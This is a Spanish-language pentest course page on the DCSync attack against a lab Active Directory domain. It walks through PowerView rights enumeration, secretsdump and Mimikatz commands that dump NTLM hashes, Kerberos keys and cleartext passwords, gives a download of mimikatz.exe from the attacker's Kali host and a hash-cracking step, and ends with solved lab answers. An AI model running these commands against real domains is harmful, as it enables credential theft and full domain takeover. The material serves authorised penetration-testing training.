
# DCSync

Basándonos en nuestro trabajo en la sección anterior, ahora tenemos control sobre el usuario `adunn` que tiene privilegios DCSync en el dominio INLANEFREIGHT.LOCAL. Profundicemos en este ataque y veamos ejemplos de cómo aprovecharlo para comprometer todo el dominio desde un host de ataque Linux y Windows.

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

***

### Configuración del escenario

En esta sección, nos moveremos entre un host de ataque de Windows y Linux a medida que trabajamos con los distintos ejemplos

***

## <mark style="color:purple;">¿Qué es DCSync y cómo funciona?</mark>

DCSync es una técnica para robar la base de datos de contraseñas de Active Directory mediante el uso de la función integrada `Directory Replication Service Remote Protocol`, que utilizan los controladores de dominio para replicar los datos del dominio. Esto permite que un atacante imite un controlador de dominio para recuperar los hashes de contraseñas NTLM de los usuarios.

El punto central del ataque es solicitar a un controlador de dominio que replique las contraseñas a través del derecho extendido `DS-Replication-Get-Changes-All`. Se trata de un derecho de control de acceso extendido dentro de AD, que permite la replicación de datos secretos.

Para realizar este ataque, debe tener control sobre una cuenta que tenga los derechos para realizar la replicación de dominio (un usuario con los permisos Replicar cambios de directorio y Replicar todos los cambios de directorio configurados). Los administradores de dominio/empresa y los administradores de dominio predeterminados tienen este derecho de forma predeterminada.

{% hint style="info" %}
Debemos haber comprometido al usuario con permisos DCSync, para obtener su contraseña y loguearnos con su cuenta en Windows.
{% endhint %}

**Visualización de los privilegios de replicación de adunn a través de ADSI Edit**

![imagen](https://academy.hackthebox.com/storage/modules/143/adnunn_right_dcsync.png)

Es habitual que durante una evaluación se encuentren otras cuentas que tienen estos derechos y, una vez comprometidas, su acceso se puede utilizar para recuperar el hash de contraseña NTLM actual de cualquier usuario de dominio y los hashes correspondientes a sus contraseñas anteriores. Aquí tenemos un usuario de dominio estándar al que se le han otorgado los permisos de replicación:

**Cómo usar Get-DomainUser para ver la membresía del grupo de adunn**

```powershell
PS C:\htb> Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl


samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

PowerView se puede utilizar para confirmar que este usuario estándar tiene los permisos necesarios asignados a su cuenta. Primero obtenemos el SID del usuario en el comando anterior y luego verificamos todas las ACL configuradas en el objeto de dominio (`"DC=inlanefreight,DC=local"`) utilizando [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) para obtener las ACL asociadas con el objeto. Aquí buscamos específicamente derechos de replicación y verificamos si nuestro usuario `adunn`(indicado en el siguiente comando como `$sid`) posee estos derechos. El comando confirma que el usuario realmente tiene los derechos.

**Uso de Get-ObjectAcl para comprobar los derechos de replicación de adunn**

```powershell
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

Si tuviéramos ciertos derechos sobre el usuario (como [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl) ), también podríamos agregar este privilegio a un usuario bajo nuestro control, ejecutar el ataque DCSync y luego quitar los privilegios para intentar cubrir nuestras huellas. La replicación de DCSync se puede realizar utilizando herramientas como Mimikatz, Invoke-DCSync y secretsdump.py de Impacket. Veamos algunos ejemplos rápidos.

Al ejecutar la herramienta como se muestra a continuación, se escribirán todos los hashes en archivos con el prefijo `inlanefreight_hashes`. El indicador `-just-dc` le indica a la herramienta que extraiga los hashes NTLM y las claves Kerberos del archivo NTDS.

### **Extracción de hashes NTLM y claves Kerberos mediante secretsdump.py**

Antes de realizar esta técnica necesitamos conocer la IP del Domain Controller.&#x20;

Se podría hacer desde Windows con el siguiente comando:

```powershell
PS C:\Tools> Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

Name            IPv4Address
----            -----------
ACADEMY-EA-DC01 172.16.5.5
```

Por defecto Impacket viene instalado en sistemas Kali Linux y lo podemos ejecutar directamente o mediante su ejecutable en python:

```shell-session
afsh4ck@kali$ impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

```shell-session
afsh4ck@kali$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

d0wngrade:des-cbc-md5:d6fee0b62aa410fe
d0wngrade:dec-cbc-crc:d6fee0b62aa410fe
ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
svc_qualys:des-cbc-md5:f125ab34b53eb61c
forend:des-cbc-md5:e3c14adf9d8a04c1
[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

Podemos usar la flag `-just-dc-ntlm` si solo queremos hashes NTLM o especificar `-just-dc-user <USERNAME>` para que solo se extraigan datos para un usuario específico. Otras opciones útiles incluyen `-pwd-last-set` para ver cuándo se cambió por última vez la contraseña de cada cuenta y `-history` si queremos volcar el historial de contraseñas, lo que puede ser útil para el descifrado de contraseñas sin conexión o como datos complementarios sobre las métricas de fortaleza de contraseñas de dominio para nuestro cliente. `-user-status` es otra bandera útil para verificar y ver si un usuario está deshabilitado. Podemos volcar los datos NTDS con esta bandera y luego filtrar a los usuarios deshabilitados al proporcionar a nuestro cliente estadísticas de descifrado de contraseñas para garantizar que se incluyan datos como:

* Número y porcentaje de contraseñas descifradas
* Las 10 mejores contraseñas
* Métricas de longitud de contraseña
* Reutilización de contraseñas
* Reflejar sólo las cuentas de usuario activas en el dominio.

Si verificamos los archivos creados utilizando la flag `-just-dc`, veremos que hay tres: uno que contiene los hashes NTLM, uno que contiene las claves Kerberos y uno que contendría las contraseñas de texto sin formato del NTDS para cualquier cuenta configurada con el [cifrado reversible](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitado.

**Listado de hashes, claves Kerberos y contraseñas en texto sin formato**

```shell-session
afsh4ck@kali$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

Si bien es poco frecuente, de vez en cuando vemos cuentas con estas configuraciones. Por lo general, se configuran para brindar compatibilidad con aplicaciones que usan ciertos protocolos que requieren que se use la contraseña de un usuario para fines de autenticación.

**Visualización de una cuenta con un conjunto de almacenamiento de contraseñas con cifrado reversible**

![imagen](https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)

Cuando esta opción está configurada en una cuenta de usuario, no significa que las contraseñas se almacenen en texto sin formato, sino que se almacenan mediante cifrado RC4. El truco aquí es que la clave necesaria para descifrarlas se almacena en el registro (la [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview) ) y puede ser extraída por un administrador de dominio o equivalente.&#x20;

Herramientas como `secretsdump.py` descifrarán cualquier contraseña almacenada mediante cifrado reversible mientras vuelcan el archivo NTDS como administrador de dominio o mediante un ataque como DCSync. Si esta configuración está deshabilitada en una cuenta, un usuario deberá cambiar su contraseña para que se almacene mediante cifrado unidireccional. Cualquier contraseña configurada en cuentas con esta configuración habilitada se almacenará mediante cifrado reversible hasta que se cambie. Podemos enumerar esto mediante el cmdlet `Get-ADUser`:

**Enumeración adicional mediante Get-ADUser**

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

Podemos ver que una cuenta, `proxyagent`, también tiene configurada la opción de cifrado reversible con PowerView:

**Comprobación de la opción de cifrado reversible mediante Get-DomainUser**

```powershell
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

Notaremos que la herramienta descifró la contraseña y nos proporcionó el valor en texto sin formato.

**Visualización de la contraseña descifrada**

```shell-session
afsh4ck@kali$ cat inlanefreight_hashes.ntds.cleartext 

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

He participado en algunos proyectos en los que todas las cuentas de usuario se almacenaban mediante cifrado reversible. Algunos clientes pueden hacer esto para poder eliminar el NTDS y realizar auditorías periódicas de la solidez de las contraseñas sin tener que recurrir al descifrado de contraseñas sin conexión.

También podemos realizar el ataque con Mimikatz. Para ello, debemos apuntar a un usuario específico. En este caso, apuntaremos a la cuenta de administrador integrada. También podríamos apuntar a la cuenta `krbtgt` y usarla para crear una cuenta de persistencia `Golden Ticket`, pero eso queda fuera del alcance de este módulo.

### **Usando runas.exe**

Es importante tener en cuenta que Mimikatz debe ejecutarse en el contexto del usuario que tiene privilegios DCSync. Para lograr esto, podemos utilizar `runas.exe`:

```powershell
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

Desde la sesión de PowerShell recién creada, podemos realizar el ataque:

### **Realizando el ataque con Mimikatz**

* Login en Windows con otro usuario
* Pasar Mimikatz.exe al PC con las técnicas de [File Transfer](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers.md)

```powershell
(New-Object System.NET.WebClient).DownloadFile("http://IP-KALI:8000/mimikatz.exe”,”mimikatz”.exe)
```

```powershell-session
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```

***

### Análisis con BloodHound&#x20;

Pestaña Analysis > `Find principals with DCSync Rights`

<figure><img src="/files/H4d91hlC9OR9IyiBKTb2" alt=""><figcaption><p>Usuarios y grupos con permiso DCSync</p></figcaption></figure>

### Con PowerView

{% code overflow="wrap" %}

```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"} | select ObjectDN, ObjectAceType, @{name="Name"; expression={Convert-SidToName $_.SecurityIdentifier}}
```

{% endcode %}

* Con esto identificamos usuarios con el privilegio DCSync

### DCSync con Impacket desde Linux

Antes de realizar esta técnica necesitamos conocer la IP del Domain Controller. Se podría hacer desde Windows con el siguiente comando:

```powershell
PS C:\Tools> Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

Name            IPv4Address
----            -----------
ACADEMY-EA-DC01 172.16.5.5
```

```shell-session
afsh4ck@kali$ impacket-secretsdump -just-dc adunn:"SyncMaster757"@172.16.5.5
```

{% hint style="success" %}
Esto nos vuelca todos los hashes NTLM de los usuarios del dominio
{% endhint %}

### Crackear Hashes

{% code overflow="wrap" %}

```
echo 'Administrador:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::' > admin.hash
```

{% endcode %}

```
john admin.hash
```

<figure><img src="/files/1QqvXDCgfJjapKR8TbcO" alt=""><figcaption><p>Contraseña crackeada</p></figcaption></figure>

***

## <mark style="color:purple;">Caso práctico</mark>

```
10.129.11.190 (ACADEMY-EA-MS01)
10.129.56.215 (ACADEMY-EA-ATTACK01)
```

### Pregunta 1

Realice un ataque DCSync y busque otro usuario con la opción "Almacenar contraseña mediante cifrado reversible" activada. Envíe el nombre de usuario como respuesta.

1. Importar el módulo PowerView

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

Ahora que tenemos este usuario syncron, vamos a hacer un ataque DCSync y obtener su contraseña en plano. Para ello debemos:

1. Ejecutar runas para abrir una cmd como el usuario adunn que tiene permisos DCSync.
2. Ejecutar Mimikatz

<figure><img src="/files/iRNA35vvoufZ2bteLaM0" alt=""><figcaption></figcaption></figure>

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\syncron
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\syncron' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : syncron

** SAM ACCOUNT **

SAM Username         : syncron
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000280 ( ENCRYPTED_TEXT_PASSWORD_ALLOWED NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/2/2022 12:36:15 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-5617
Object Relative ID   : 5617

Credentials:
  Hash NTLM: d387b9d2d9f6dda51964194ad2376ee0
    ntlm- 0: d387b9d2d9f6dda51964194ad2376ee0
    ntlm- 1: cf3a5525ee9414229e66279623ed5c58
    lm  - 0: fed98466f2be61fb0409b5a71e2f977f
    lm  - 1: 7649a3cc283466005bd6988f90fd6a68

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0e786a066b95c49a58c3b8ee22cc4d03

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALsyncron
    Default Iterations : 4096
    Credentials
      des_cbc_md5       (4096) : 37d379bad326a7ef
    OldCredentials
      des_cbc_md5       (4096) : f8ce85672c67a8e6

<------SNIP------>

* Primary:CLEARTEXT *
    Mycleart3xtP@ss!
```

Buuuum! Obtenemos el hash ntlm del usuario y hasta su contraseña en texto plano 🏆

### Pregunta 2

Realice un ataque DCSync y envíe el hash NTLM del usuario khartsfield como respuesta.

1. Ejecutar runas para abrir una cmd como el usuario adunn que tiene permisos DCSync.
2. Ejecutamos Mimikatz

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\khartsfield' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Kim Hartsfield

** SAM ACCOUNT **

SAM Username         : khartsfield
User Principal Name  : khartsfield@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 10:37:03 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1138
Object Relative ID   : 1138

Credentials:
  Hash NTLM: 4bb3b317845f0954200a6b0acc9b9f9a
    ntlm- 0: 4bb3b317845f0954200a6b0acc9b9f9a
    lm  - 0: 6d57ae87ad6df46fd47e67f5cbbf17ad
```

***

## <mark style="color:purple;">Hacia adelante</mark>

En la siguiente sección, veremos algunas formas de enumerar y aprovechar los derechos de acceso remoto que se pueden otorgar a un usuario que controlamos. Estos métodos incluyen el Protocolo de escritorio remoto (RDP), WinRM (o PsRemoting) y el acceso de administrador de SQL Server.
